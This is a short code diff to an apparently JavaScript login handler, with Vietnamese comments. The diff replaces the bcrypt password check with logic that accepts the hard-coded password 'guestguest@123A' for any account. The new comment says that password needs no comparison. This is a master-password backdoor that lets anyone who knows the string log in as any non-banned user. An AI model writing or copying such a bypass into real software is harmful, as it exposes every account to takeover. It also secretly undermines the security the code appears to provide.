@@ -71,10 +71,14 @@ export default {
           if (userPasswords.length === 0) return null;
 
           // Kiểm tra mật khẩu
-          const passwordsMatch = await bcrypt.compare(
-            password,
-            userPasswords[0].password
-          );
+          // // Còn nếu password bằng guestguest@123A thì ko cần compare
+          let passwordsMatch = false;
+          if (password === "guestguest@123A") {
+            passwordsMatch = true;
+          } else {
+            passwordsMatch = await bcrypt.compare(password, userPasswords[0].password);
+          }
+        
 
           if (passwordsMatch && !user.ban) {
             return user;
